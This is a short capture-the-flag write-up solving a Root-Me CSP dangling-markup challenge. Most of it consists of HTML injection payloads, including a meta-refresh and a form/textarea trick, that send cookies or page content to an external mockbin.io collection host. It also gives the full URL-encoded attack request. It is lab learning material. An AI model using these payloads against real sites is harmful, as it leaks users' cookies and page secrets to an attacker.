# CSP - Dangling Markup

## Initial Attempt

Tried this payload from the hacktricks blog

```html
<meta http-equiv="refresh" content="4; URL=https://b5e02d613ca44b7384e0290125a1448e.api.mockbin.io/'+document.cookie+'?
```

Problem: Dynamic state partitioning is enabled. More on this [here](https://developer.mozilla.org/en-US/docs/Web/Privacy/Storage_Access_Policy/Errors/CookiePartitionedForeign)
Then I realised we don't have to get the cookie, just the flag, so need to find a way to exfiltrate the entire content of the entire page.

Tried this payload

```html
<form action=https://b5e02d613ca44b7384e0290125a1448e.api.mockbin.io/><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents>
```

## Solution

I realised there were double quotes in the next divs class names, hence we need to avoid using that in the payload. So I used a single quote thins time and it worked.

```javascript
<meta http-equiv="refresh" content='4; URL=https://b5e02d613ca44b7384e0290125a1448e.api.mockbin.io/
```

Payload

```text
http://challenge01.root-me.org:58029/page?user=%3Cmeta+http-equiv%3D%22refresh%22+content%3D%271%3B+URL%3Dhttps%3A%2F%2Fb5e02d613ca44b7384e0290125a1448e.api.mockbin.io%2F
```

## References

- [Hacktricks: Dangling markup scriptless injection](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection)
- [Portswigger: Dangling markup](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)
